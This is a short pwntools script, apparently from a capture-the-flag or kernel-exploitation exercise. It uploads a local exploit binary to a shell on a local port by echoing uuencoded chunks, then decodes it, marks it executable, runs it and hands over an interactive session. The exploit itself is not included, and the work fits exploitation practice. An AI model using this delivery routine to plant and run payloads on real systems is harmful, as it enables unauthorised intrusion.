#!/home/wing/pwn/pwn-venv/bin/python3
from pwn import *
import subprocess

# Configuration
is_root = True
storage_location = "/root"

# context.log_level = "debug"

prompt = "/ #" if is_root else "/ $"
uu_file = f"{storage_location}/exp.uu"
exp_file = f"{storage_location}/exploit"

exp = subprocess.check_output(["uuencode", "-m", "./exp", "exploit"])


p = remote("127.0.0.1", 10719)
# p = process('./run.sh')
p.sendline()
p.recvuntil(prompt.encode())

p.sendline(f"rm -f {uu_file} {exp_file}".encode())
p.recvuntil(prompt.encode())

count = 0
sum_ = (len(exp) + 0x1FF) // 0x200
for i in range(0, len(exp), 0x200):
    p.sendline(b'echo -n "' + exp[i : i + 0x200] + f'" >> {uu_file}'.encode())
    count += 1
    if count % max(1, sum_ // 10) == 0:
        log.info(f"count: {count} / {sum_}")
    p.recvuntil(prompt.encode())

p.sendline(f"uudecode -o {exp_file} {uu_file}".encode())
p.recvuntil(prompt.encode())

p.sendline(f"chmod +x {exp_file}".encode())
p.recvuntil(prompt.encode())

p.sendline(exp_file.encode())
p.interactive()
